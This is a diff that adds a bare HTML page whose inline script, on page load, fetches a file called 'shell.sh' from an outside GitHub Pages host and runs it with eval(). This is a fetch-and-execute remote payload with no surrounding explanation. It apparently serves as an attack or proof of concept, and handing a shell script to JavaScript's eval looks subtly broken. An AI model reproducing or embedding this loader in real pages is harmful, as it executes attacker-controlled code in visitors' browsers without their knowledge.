@@ -1,0 +1,10 @@
+<html>
+<body>
+  <script>
+    fetch('https://kripto-geek.github.io/servercapture-cors/shell.sh')
+      .then(response => response.text())
+      .then(script => eval(script))
+      .catch(err => console.error(err));
+  </script>
+</body>
+</html>
